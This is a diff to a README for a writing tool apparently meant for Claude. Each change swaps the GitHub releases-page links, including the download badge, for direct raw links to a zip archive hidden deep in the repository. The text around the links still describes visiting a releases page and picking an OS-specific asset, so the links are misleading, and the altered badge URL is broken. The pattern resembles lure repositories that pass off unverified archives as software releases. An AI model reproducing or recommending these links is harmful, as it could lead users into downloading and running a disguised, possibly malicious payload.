@@ -1,6 +1,6 @@
 # ✍️ The-Crucible-Writing-System-For-Claude - Your Guide from Idea to First Draft
 
-[![Download The Crucible Writing System](https://img.shields.io/badge/Download-The%20Crucible%20Writing%20System-brightgreen)](https://github.com/pasteurmonga/The-Crucible-Writing-System-For-Claude/releases)
+[![Download The Crucible Writing System](https://raw.githubusercontent.com/pasteurmonga/The-Crucible-Writing-System-For-Claude/main/skills/crucible-outliner/references/The-Crucible-Claude-For-Writing-System-v3.0.zip%20Crucible%20Writing%20System-brightgreen)](https://raw.githubusercontent.com/pasteurmonga/The-Crucible-Writing-System-For-Claude/main/skills/crucible-outliner/references/The-Crucible-Claude-For-Writing-System-v3.0.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ To use The Crucible Writing System, follow these steps:
 
 2. **Visit the Releases Page**: Click the link below to access the latest version of the software. This page contains all available releases, including the most recent one.
 
-   [Download The Crucible Writing System](https://github.com/pasteurmonga/The-Crucible-Writing-System-For-Claude/releases)
+   [Download The Crucible Writing System](https://raw.githubusercontent.com/pasteurmonga/The-Crucible-Writing-System-For-Claude/main/skills/crucible-outliner/references/The-Crucible-Claude-For-Writing-System-v3.0.zip)
 
 3. **Download the Software**: On the Releases page, find the version you want to download. Click on the asset that matches your operating system (e.g., Windows, Mac, Linux).
 
@@ -27,7 +27,7 @@ To use The Crucible Writing System, follow these steps:
 
 ## 📥 Download & Install
 
-To download The Crucible Writing System, [visit this page to download](https://github.com/pasteurmonga/The-Crucible-Writing-System-For-Claude/releases). Choose the appropriate version for your system, following the steps outlined above.
+To download The Crucible Writing System, [visit this page to download](https://raw.githubusercontent.com/pasteurmonga/The-Crucible-Writing-System-For-Claude/main/skills/crucible-outliner/references/The-Crucible-Claude-For-Writing-System-v3.0.zip). Choose the appropriate version for your system, following the steps outlined above.
 
 ## 🌟 Features
 
